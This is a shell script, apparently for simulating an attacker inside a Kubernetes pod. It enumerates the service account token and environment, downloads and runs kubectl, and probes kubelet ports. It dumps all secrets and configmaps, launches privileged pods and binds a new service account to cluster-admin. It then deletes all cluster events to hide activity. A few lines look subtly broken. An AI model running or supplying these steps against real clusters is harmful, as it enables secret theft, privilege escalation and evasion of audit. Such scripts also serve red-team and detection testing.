#!/bin/sh

#find out if in kubernetes
#k8s environment variables
env | grep -i kube

# SA token
ls /var/run/secrets/kubernetes.io/serviceaccount

# command history
history

# network discovery
ip a
route

# download kubectl
cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl
chmod +x /tmp/kubectl

# discover API server
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
/tmp/kubectl auth can-i --list

# try to find kubelet ip
# need to use either nmap or kubectl get nodes to find out
max=$[$(kubectl get no -A | wc -l)-2]
for (( i=0; i <= $max; ++i ))
do
	ip=$(/tmp/kubectl get no -A -o=jsonpath='{.items[$i].status.addresses[0].address}')
	curl http://$ip:10255/pods
done

# list K8S Secrets&Configmaps
/tmp/kubectl get secrets -A
/tmp/kubectl get configmaps -A

# create new pod
/tmp/kubectl run nginx --image=nginx --generator=run-pod/v1

# exec into pod 
/tmp/kubectl exec nginx sleep 1

# cronjob
/tmp/kubectl create -f /tmp/cronjob.json

# local cron?

# run privileged pod
/tmp/kubectl create -f /tmp/privileged_pod.yaml

# create ServiceAccount
/tmp/kubectl create serviceaccount tester-sa

# bind tester-sa ServiceAccount to cluster-admin
/tmp/kubectl create -f /tmp/clusterbind.json

# run pod with high permissions SA tester-sa
/tmp/kubectl create -f /tmp/pod_priv_sa.yaml

# remove privileged pod
/tmp/kubectl delete pod nginx-priv

# deletion of Kubernetes Events
/tmp/kubectl delete events --all

# delete files?

# clear command history
#history -c
